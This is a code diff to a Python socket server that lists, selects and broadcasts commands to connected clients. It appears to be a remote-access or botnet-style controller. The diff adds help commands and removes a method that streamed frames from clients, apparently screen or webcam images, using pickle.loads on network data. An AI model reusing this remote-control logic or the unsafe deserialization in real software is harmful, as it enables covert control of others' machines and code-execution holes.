@@ -68,15 +68,16 @@ socket.setdefaulttimeout(None)
 
 HELP_CMDS   = ''' 
 Server Commands
-------------------------------------------------------------------
+--------------------------------------------------------------------
     command <args> [option] | descripton
-------------------------------------------------------------------
+--------------------------------------------------------------------
     client <id>             | Connect to a client
     clients                 | List connected clients
     back                    | Deselect current client
     quit                    | Exit server and keep clients alive
+    usage                   | display usage help for server commands
     sendall <command>       | Send command to all clients
-------------------------------------------------------------------
+--------------------------------------------------------------------
 < > = required argument
 [ ] = optional argument
 '''
@@ -95,7 +96,11 @@ class Server(object):
             'client'        :   self.select_client,
             'clients'       :   self.list_clients,
             'quit'          :   self.quit_server,
-	    'sendall'	    :   self.sendall_clients
+	    'sendall'	    :   self.sendall_clients,
+            'usage'         :   self.print_help,
+            '--help'        :   self.print_help,
+            '-h'            :   self.print_help,
+            '?'             :   self.print_help
             }
         self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -179,7 +184,7 @@ class Server(object):
     def deselect_client(self):
         if self.current_client:
             self.current_client.lock.acquire_lock()
-            self.current_client = None
+        self.current_client = None
         self.run()
 
     def send_client(self, msg, client=None):
@@ -237,29 +242,6 @@ class Server(object):
                     except: pass
             finally:
                 sys.exit(0)
-
-    def livestream_client(self, client=None):
-        data    = ""
-        header  = struct.calcsize("L")
-        client  = client or self.current_client
-        if client:
-            while True:
-                try:
-                    while len(data) < header:
-                        data   += client.conn.recv(4096)
-                    packed_size = data[:header]
-                    data        = data[header:]
-                    msg_size    = struct.unpack("L", packed_size)[0]
-                    while len(data) < msg_size:
-                        data   += client.conn.recv(4096)
-                    frame_data  = data[:msg_size]
-                    data        = data[msg_size:]
-                    frame       = pickle.loads(frame_data)    
-                    cv2.imshow(client.addr, frame)
-                    if cv2.waitKey(30) & 0xFF == 27:
-                        break
-                except KeyboardInterrupt:
-                    cv2.destroyAllWindows()
 
     def get_client_info(self, client=None):
         client = client or self.current_client
